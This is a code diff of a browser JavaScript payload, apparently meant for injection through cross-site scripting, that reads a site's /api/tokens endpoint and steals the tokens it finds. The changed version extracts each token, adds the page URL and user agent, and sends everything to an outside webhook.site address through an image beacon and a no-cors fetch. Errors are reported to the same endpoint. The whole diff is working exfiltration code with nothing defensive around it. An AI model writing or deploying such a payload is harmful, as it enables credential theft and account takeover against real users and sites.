@@ -4,21 +4,41 @@ fetch("/api/tokens?limit=100", {
 })
 .then(r => r.json())
 .then(data => {
-  // Encode the entire JSON response
-  const payload = encodeURIComponent(JSON.stringify(data));
+  console.log("[+] API response received:", data);
 
-  // Send it as a GET request to your webhook
-  const exfil = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?fullResponse=${payload}`;
+  // Check if the response is an object with an `entries` array (based on your screenshot)
+  const entries = Array.isArray(data.entries) ? data.entries : [];
+  console.log("[+] Token entries count:", entries.length);
 
-  // Use image beacon (works cross-origin)
-  const img = new Image();
-  img.src = exfil;
+  if (entries.length > 0) {
+    // Extract all tokens
+    const tokens = entries.map(e => e.token).filter(Boolean);
+    console.log("[+] Extracted tokens:", tokens);
 
-  // Also use fetch as fallback (no-cors)
-  fetch(exfil, { mode: "no-cors" });
+    if (tokens.length > 0) {
+      const fullPayload = {
+        tokens,
+        location: location.href,
+        ua: navigator.userAgent
+      };
+
+      const url = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?data=" +
+                  encodeURIComponent(JSON.stringify(fullPayload));
+
+      console.log("[+] Sending token to webhook:", url);
+
+      // Use both image beacon and fetch
+      new Image().src = url;
+      fetch(url, { mode: "no-cors" });
+    } else {
+      console.warn("[!] No tokens found in entries.");
+    }
+  } else {
+    console.warn("[!] No entries array or empty.");
+  }
 })
 .catch(e => {
-  // Send error to webhook
+  console.error("[!] Error occurred:", e.message);
   const err = encodeURIComponent(e.message);
   new Image().src = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=${err}`;
 });
